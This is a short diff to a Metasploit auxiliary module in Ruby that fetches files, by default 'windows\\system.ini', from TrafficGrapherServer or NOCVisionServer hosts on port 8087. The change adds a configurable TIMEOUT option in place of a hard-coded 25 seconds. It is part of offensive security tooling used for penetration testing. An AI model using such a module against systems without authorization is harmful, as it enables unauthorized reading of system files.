@@ -38,10 +38,15 @@ class Metasploit3 < Msf::Auxiliary
         # 8087 = TrafficGrapherServer
         # 8090 = NOCVisionServer
         Opt::RPORT(8087),
-        OptString.new('FILEPATH', [false, 'The name of the file to download', 'windows\\system.ini'])
+        OptString.new('FILEPATH', [false, 'The name of the file to download', 'windows\\system.ini' ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 25 ])
       ], self.class)
 
     deregister_options('RHOST')
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def run_host(ip)
@@ -58,7 +63,7 @@ class Metasploit3 < Msf::Auxiliary
     res = send_request_raw({
       'method' => 'GET',
       'uri'    => uri
-    }, 25)
+    }, timeout)
 
     if res
       print_status("#{ip}:#{rport} returns: #{res.code.to_s}")
